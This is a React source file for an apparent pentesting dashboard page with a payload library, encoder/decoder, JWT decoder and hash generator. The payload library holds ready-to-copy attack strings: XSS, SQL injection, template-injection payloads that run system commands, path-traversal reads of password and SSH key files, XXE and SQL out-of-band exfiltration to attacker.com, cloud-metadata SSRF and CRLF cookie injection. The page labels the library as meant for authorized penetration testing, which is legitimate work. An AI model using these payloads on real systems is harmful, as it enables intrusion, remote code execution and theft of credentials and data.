'use client'

import { useState } from 'react'
import { Copy, Check, Key, Code2, Lock, Shuffle } from 'lucide-react'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Textarea } from '@/components/ui/textarea'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { PageHeader } from '@/components/shared/page-header'
import { Label } from '@/components/ui/label'

// ── Copy button ───────────────────────────────────────────────────────────────

function CopyBtn({ text, className }: { text: string; className?: string }) {
  const [copied, setCopied] = useState(false)
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500) }}
      className={`inline-flex items-center gap-1 text-xs text-muted-foreground hover:text-primary transition-colors ${className}`}
    >
      {copied ? <Check className="h-3 w-3 text-green-400" /> : <Copy className="h-3 w-3" />}
      {copied ? 'Copied' : 'Copy'}
    </button>
  )
}

// ── Payload Library ───────────────────────────────────────────────────────────

const PAYLOADS: Record<string, { label: string; items: { name: string; payload: string; context?: string }[] }> = {
  xss: {
    label: 'XSS',
    items: [
      { name: 'Basic alert', payload: '<script>alert(1)</script>' },
      { name: 'Image onerror', payload: '<img src=x onerror=alert(1)>' },
      { name: 'SVG onload', payload: '<svg onload=alert(1)>' },
      { name: 'Input autofocus', payload: '<input autofocus onfocus=alert(1)>' },
      { name: 'JavaScript URI', payload: 'javascript:alert(1)' },
      { name: 'Template literal', payload: '`${alert(1)}`' },
      { name: 'DOM-based (hash)', payload: '#"><img src=x onerror=alert(1)>' },
      { name: 'Attribute break', payload: '" onmouseover="alert(1)' },
      { name: 'Style tag', payload: '<style>*{background:url(javascript:alert(1))}</style>' },
      { name: 'Iframe srcdoc', payload: '<iframe srcdoc="<script>alert(1)</script>">' },
      { name: 'Polyglot 1', payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//' },
      { name: 'Angular SSTI', payload: '{{constructor.constructor("alert(1)")()}}', context: 'AngularJS template injection' },
    ],
  },
  sqli: {
    label: 'SQLi',
    items: [
      { name: 'Classic OR', payload: "' OR '1'='1" },
      { name: 'Comment out', payload: "admin'--" },
      { name: 'Time-based (MySQL)', payload: "' OR SLEEP(5)--", context: 'Blind time-based' },
      { name: 'Time-based (MSSQL)', payload: "'; WAITFOR DELAY '0:0:5'--", context: 'MSSQL blind' },
      { name: 'UNION columns (2)', payload: "' UNION SELECT NULL,NULL--" },
      { name: 'UNION columns (3)', payload: "' UNION SELECT NULL,NULL,NULL--" },
      { name: 'Extract DB name', payload: "' UNION SELECT database(),NULL--" },
      { name: 'Extract tables', payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--" },
      { name: 'Stacked query', payload: "'; INSERT INTO users VALUES('hacked','hacked')--" },
      { name: 'Boolean blind', payload: "' AND 1=1--", context: 'Should return results' },
      { name: 'OOB (DNS)', payload: "'; EXEC master..xp_dirtree '//attacker.com/a'--", context: 'MSSQL out-of-band' },
      { name: 'PostgreSQL sleep', payload: "'; SELECT pg_sleep(5)--" },
    ],
  },
  ssti: {
    label: 'SSTI',
    items: [
      { name: 'Jinja2 basic', payload: '{{7*7}}', context: 'Jinja2/Twig — should return 49' },
      { name: 'Jinja2 config', payload: '{{config}}' },
      { name: 'Jinja2 RCE', payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" },
      { name: 'Twig basic', payload: '{{7*7}}' },
      { name: 'Twig PHP exec', payload: "{{['id']|filter('system')}}", context: 'PHP Twig' },
      { name: 'Freemarker', payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', context: 'Java Freemarker' },
      { name: 'Velocity', payload: '#set($e="")#set($e=$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))' },
      { name: 'Smarty', payload: '{php}echo `id`;{/php}', context: 'PHP Smarty' },
      { name: 'ERB (Ruby)', payload: '<%= `id` %>' },
      { name: 'Pebble', payload: '{% for i in range(0, 3) %}...{% endfor %}' },
    ],
  },
  lfi: {
    label: 'LFI/Path',
    items: [
      { name: 'Unix passwd', payload: '../../../../etc/passwd' },
      { name: 'Unix passwd (null)', payload: '../../../../etc/passwd%00' },
      { name: 'Windows sys', payload: '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' },
      { name: 'PHP wrapper', payload: 'php://filter/convert.base64-encode/resource=/etc/passwd' },
      { name: 'PHP input', payload: 'php://input', context: 'POST body is executed as PHP' },
      { name: 'Log poisoning', payload: '/var/log/apache2/access.log', context: 'Inject PHP via User-Agent first' },
      { name: 'Proc self', payload: '/proc/self/environ' },
      { name: 'Double encoding', payload: '..%252f..%252f..%252fetc%252fpasswd' },
      { name: 'URL encoding', payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' },
      { name: 'SSH keys', payload: '../../../../root/.ssh/authorized_keys' },
    ],
  },
  xxe: {
    label: 'XXE',
    items: [
      { name: 'Basic file read', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' },
      { name: 'SSRF via XXE', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', context: 'AWS metadata endpoint' },
      { name: 'OOB data exfil', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/?data=">%xxe;]>' },
      { name: 'Billion laughs (DoS)', payload: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>' },
    ],
  },
  ssrf: {
    label: 'SSRF',
    items: [
      { name: 'AWS metadata', payload: 'http://169.254.169.254/latest/meta-data/' },
      { name: 'AWS metadata (new)', payload: 'http://fd00:ec2::254/latest/meta-data/' },
      { name: 'GCP metadata', payload: 'http://metadata.google.internal/computeMetadata/v1/' },
      { name: 'Azure IMDS', payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' },
      { name: 'Localhost redirect', payload: 'http://localhost/' },
      { name: 'DNS rebinding', payload: 'http://spoofed.burpcollaborator.net/' },
      { name: 'IPv6 localhost', payload: 'http://[::1]/' },
      { name: 'Decimal IP', payload: 'http://2130706433/', context: '127.0.0.1 in decimal' },
      { name: 'URL bypass', payload: 'http://attacker.com@127.0.0.1/' },
      { name: 'Double URL encode', payload: 'http://127.0.0.1%2F..%2F' },
    ],
  },
  open_redirect: {
    label: 'Open Redirect',
    items: [
      { name: 'Basic redirect', payload: 'https://evil.com' },
      { name: 'Protocol relative', payload: '//evil.com' },
      { name: 'URL param', payload: '?url=https://evil.com' },
      { name: 'JavaScript URI', payload: 'javascript:document.location="https://evil.com"' },
      { name: 'With encoding', payload: '%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d' },
      { name: 'Double slash', payload: 'https:///evil.com' },
      { name: 'CRLF injection', payload: '/redirect?url=https://evil.com%0d%0aSet-Cookie: session=stolen' },
    ],
  },
}

function PayloadLibrary() {
  const [category, setCategory] = useState('xss')
  const [search, setSearch] = useState('')

  const data = PAYLOADS[category]
  const items = data?.items.filter(i =>
    !search || i.name.toLowerCase().includes(search) || i.payload.toLowerCase().includes(search)
  ) || []

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">Browse and copy attack payloads for manual testing. Intended for authorized penetration testing and bug bounty programs.</p>
      <div className="flex gap-2 flex-wrap">
        {Object.entries(PAYLOADS).map(([key, val]) => (
          <Button
            key={key}
            variant={category === key ? 'default' : 'outline'}
            size="sm"
            onClick={() => { setCategory(key); setSearch('') }}
          >
            {val.label}
          </Button>
        ))}
      </div>
      <Input placeholder="Filter payloads..." value={search} onChange={e => setSearch(e.target.value)} className="max-w-sm h-8 text-xs" />
      <div className="space-y-2">
        {items.map((item, i) => (
          <div key={i} className="rounded-lg border bg-card group hover:border-primary/30 transition-colors">
            <div className="flex items-center justify-between px-3 py-2 border-b border-border/50">
              <span className="text-xs font-medium">{item.name}</span>
              <div className="flex items-center gap-2">
                {item.context && <span className="text-[10px] text-muted-foreground hidden group-hover:block">{item.context}</span>}
                <CopyBtn text={item.payload} />
              </div>
            </div>
            <pre className="px-3 py-2 text-xs font-mono text-primary break-all whitespace-pre-wrap max-h-24 overflow-y-auto">{item.payload}</pre>
          </div>
        ))}
      </div>
    </div>
  )
}

// ── Encoder / Decoder ─────────────────────────────────────────────────────────

function EncoderDecoder() {
  const [input, setInput] = useState('')
  const [output, setOutput] = useState('')
  const [mode, setMode] = useState<'encode' | 'decode'>('encode')
  const [format, setFormat] = useState('base64')

  const run = () => {
    try {
      let result = ''
      if (format === 'base64') {
        result = mode === 'encode'
          ? btoa(unescape(encodeURIComponent(input)))
          : decodeURIComponent(escape(atob(input)))
      } else if (format === 'url') {
        result = mode === 'encode' ? encodeURIComponent(input) : decodeURIComponent(input)
      } else if (format === 'url_full') {
        result = mode === 'encode' ? encodeURI(input) : decodeURI(input)
      } else if (format === 'html') {
        if (mode === 'encode') {
          result = input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;')
        } else {
          result = input.replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&quot;/g,'"').replace(/&#x27;/g,"'")
        }
      } else if (format === 'hex') {
        if (mode === 'encode') {
          result = Array.from(input).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join('')
        } else {
          result = input.replace(/\s/g,'').match(/.{1,2}/g)?.map(b => String.fromCharCode(parseInt(b,16))).join('') || ''
        }
      } else if (format === 'unicode') {
        if (mode === 'encode') {
          result = Array.from(input).map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,'0')}`).join('')
        } else {
          result = input.replace(/\\u([0-9a-fA-F]{4})/g, (_,h) => String.fromCharCode(parseInt(h,16)))
        }
      } else if (format === 'binary') {
        if (mode === 'encode') {
          result = Array.from(input).map(c => c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ')
        } else {
          result = input.split(' ').map(b => String.fromCharCode(parseInt(b,2))).join('')
        }
      }
      setOutput(result)
    } catch {
      setOutput('Error: invalid input for this encoding')
    }
  }

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">Encode and decode strings: Base64, URL, HTML entity, Hex, Unicode, and Binary.</p>
      <div className="flex gap-2 flex-wrap items-center">
        <Select value={format} onValueChange={setFormat}>
          <SelectTrigger className="w-40 h-8 text-xs">
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="base64">Base64</SelectItem>
            <SelectItem value="url">URL (component)</SelectItem>
            <SelectItem value="url_full">URL (full)</SelectItem>
            <SelectItem value="html">HTML Entity</SelectItem>
            <SelectItem value="hex">Hex</SelectItem>
            <SelectItem value="unicode">Unicode (\u)</SelectItem>
            <SelectItem value="binary">Binary</SelectItem>
          </SelectContent>
        </Select>
        <div className="flex gap-1">
          <Button size="sm" variant={mode === 'encode' ? 'default' : 'outline'} onClick={() => setMode('encode')}>Encode</Button>
          <Button size="sm" variant={mode === 'decode' ? 'default' : 'outline'} onClick={() => setMode('decode')}>Decode</Button>
        </div>
      </div>
      <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
        <div className="space-y-1">
          <Label className="text-xs">Input</Label>
          <Textarea
            value={input}
            onChange={e => setInput(e.target.value)}
            placeholder="Enter text to encode/decode..."
            className="font-mono text-xs min-h-32 resize-y"
          />
        </div>
        <div className="space-y-1">
          <div className="flex items-center justify-between">
            <Label className="text-xs">Output</Label>
            {output && <CopyBtn text={output} />}
          </div>
          <Textarea
            value={output}
            readOnly
            placeholder="Result appears here..."
            className="font-mono text-xs min-h-32 resize-y bg-muted/30"
          />
        </div>
      </div>
      <div className="flex gap-2">
        <Button onClick={run} disabled={!input}>
          <Shuffle className="h-4 w-4 mr-1" /> {mode === 'encode' ? 'Encode' : 'Decode'}
        </Button>
        <Button variant="outline" onClick={() => { setInput(output); setOutput('') }}>Swap</Button>
        <Button variant="ghost" onClick={() => { setInput(''); setOutput('') }}>Clear</Button>
      </div>
    </div>
  )
}

// ── JWT Decoder ───────────────────────────────────────────────────────────────

function JwtDecoder() {
  const [token, setToken] = useState('')

  const decode = (part: string) => {
    try {
      const padded = part + '='.repeat((4 - part.length % 4) % 4)
      return JSON.parse(atob(padded.replace(/-/g,'+').replace(/_/g,'/')))
    } catch {
      return null
    }
  }

  const parts = token.trim().split('.')
  const isValid = parts.length === 3
  const header = isValid ? decode(parts[0]) : null
  const payload = isValid ? decode(parts[1]) : null
  const now = Math.floor(Date.now() / 1000)
  const expired = payload?.exp && payload.exp < now
  const issuedAt = payload?.iat ? new Date(payload.iat * 1000).toLocaleString() : null
  const expiresAt = payload?.exp ? new Date(payload.exp * 1000).toLocaleString() : null

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">Decode and inspect JSON Web Tokens. Analyzes header, payload, and expiry. Does NOT verify the signature.</p>
      <div className="space-y-1">
        <Label className="text-xs">JWT Token</Label>
        <Textarea
          value={token}
          onChange={e => setToken(e.target.value)}
          placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
          className="font-mono text-xs min-h-20"
        />
      </div>

      {token && !isValid && (
        <div className="rounded-md border border-destructive/40 bg-destructive/10 px-3 py-2 text-xs text-destructive">Invalid JWT format — expected 3 dot-separated parts.</div>
      )}

      {isValid && (
        <div className="space-y-4">
          {expired !== undefined && (
            <div className={`rounded-md border px-3 py-2 text-sm font-medium ${expired ? 'border-red-500/40 bg-red-500/10 text-red-400' : 'border-green-500/40 bg-green-500/10 text-green-400'}`}>
              {expired ? '✗ Token is EXPIRED' : '✓ Token is valid (not expired)'}
            </div>
          )}

          <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
            <Card>
              <CardHeader className="pb-2">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-xs uppercase text-muted-foreground">Header</CardTitle>
                  <CopyBtn text={JSON.stringify(header, null, 2)} />
                </div>
              </CardHeader>
              <CardContent>
                {header ? (
                  <div className="space-y-1">
                    {Object.entries(header).map(([k, v]) => (
                      <div key={k} className="flex gap-2 text-xs">
                        <span className="text-primary font-mono shrink-0">{k}:</span>
                        <span className="font-mono break-all">{String(v)}</span>
                      </div>
                    ))}
                  </div>
                ) : <p className="text-xs text-muted-foreground">Could not decode header</p>}
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="pb-2">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-xs uppercase text-muted-foreground">Payload</CardTitle>
                  <CopyBtn text={JSON.stringify(payload, null, 2)} />
                </div>
              </CardHeader>
              <CardContent>
                {payload ? (
                  <div className="space-y-1">
                    {Object.entries(payload).map(([k, v]) => (
                      <div key={k} className="flex gap-2 text-xs">
                        <span className="text-primary font-mono shrink-0">{k}:</span>
                        <span className="font-mono break-all text-muted-foreground">
                          {k === 'iat' || k === 'exp' || k === 'nbf'
                            ? `${v} (${new Date(Number(v) * 1000).toLocaleString()})`
                            : String(typeof v === 'object' ? JSON.stringify(v) : v)}
                        </span>
                      </div>
                    ))}
                  </div>
                ) : <p className="text-xs text-muted-foreground">Could not decode payload</p>}
              </CardContent>
            </Card>
          </div>

          <Card>
            <CardHeader className="pb-2"><CardTitle className="text-xs uppercase text-muted-foreground">Timing</CardTitle></CardHeader>
            <CardContent>
              <div className="grid grid-cols-1 gap-2 sm:grid-cols-3 text-xs">
                {issuedAt && <div><span className="text-muted-foreground">Issued At: </span><span className="font-mono">{issuedAt}</span></div>}
                {expiresAt && <div><span className="text-muted-foreground">Expires At: </span><span className={`font-mono ${expired ? 'text-red-400' : 'text-green-400'}`}>{expiresAt}</span></div>}
                <div><span className="text-muted-foreground">Now: </span><span className="font-mono">{new Date().toLocaleString()}</span></div>
              </div>
            </CardContent>
          </Card>

          <Card className="border-orange-500/20">
            <CardContent className="p-3">
              <p className="text-[10px] text-orange-400/80">
                ⚠ Signature is NOT verified. This decoder only shows the decoded claims. For signature verification, use a proper JWT library with the correct secret/key.
              </p>
            </CardContent>
          </Card>
        </div>
      )}
    </div>
  )
}

// ── Hash Generator ────────────────────────────────────────────────────────────

function HashGenerator() {
  const [input, setInput] = useState('')
  const [hashes, setHashes] = useState<Record<string, string>>({})
  const [loading, setLoading] = useState(false)

  const generate = async () => {
    if (!input) return
    setLoading(true)
    const encoder = new TextEncoder()
    const data = encoder.encode(input)
    const results: Record<string, string> = {}
    for (const algo of ['SHA-1', 'SHA-256', 'SHA-384', 'SHA-512']) {
      const buffer = await crypto.subtle.digest(algo, data)
      results[algo] = Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2,'0')).join('')
    }
    setHashes(results)
    setLoading(false)
  }

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">Generate cryptographic hashes using the browser&apos;s Web Crypto API. Computed locally - nothing is sent to the server.</p>
      <div className="flex gap-2">
        <Input
          value={input}
          onChange={e => setInput(e.target.value)}
          placeholder="Enter text to hash..."
          className="font-mono text-sm"
          onKeyDown={e => e.key === 'Enter' && generate()}
        />
        <Button onClick={generate} disabled={!input || loading}>Generate</Button>
      </div>
      {Object.entries(hashes).length > 0 && (
        <div className="space-y-2">
          {Object.entries(hashes).map(([algo, hash]) => (
            <div key={algo} className="rounded-lg border p-3">
              <div className="flex items-center justify-between mb-1">
                <Badge variant="secondary" className="text-[10px]">{algo}</Badge>
                <CopyBtn text={hash} />
              </div>
              <p className="font-mono text-xs break-all text-primary">{hash}</p>
            </div>
          ))}
        </div>
      )}
    </div>
  )
}

// ── Page ──────────────────────────────────────────────────────────────────────

export default function SecurityTestingPage() {
  return (
    <div className="space-y-6">
      <PageHeader
        title="Security Testing"
        description="Built-in pentesting utilities — payload library, encoder/decoder, JWT analyzer, hash generator"
      />

      <Tabs defaultValue="payloads">
        <TabsList className="flex-wrap h-auto gap-1">
          <TabsTrigger value="payloads"><Code2 className="h-3.5 w-3.5 mr-1.5" />Payload Library</TabsTrigger>
          <TabsTrigger value="encoder"><Shuffle className="h-3.5 w-3.5 mr-1.5" />Encoder/Decoder</TabsTrigger>
          <TabsTrigger value="jwt"><Key className="h-3.5 w-3.5 mr-1.5" />JWT Decoder</TabsTrigger>
          <TabsTrigger value="hash"><Lock className="h-3.5 w-3.5 mr-1.5" />Hash Generator</TabsTrigger>
        </TabsList>

        <TabsContent value="payloads" className="mt-6"><PayloadLibrary /></TabsContent>
        <TabsContent value="encoder" className="mt-6"><EncoderDecoder /></TabsContent>
        <TabsContent value="jwt" className="mt-6"><JwtDecoder /></TabsContent>
        <TabsContent value="hash" className="mt-6"><HashGenerator /></TabsContent>
      </Tabs>
    </div>
  )
}
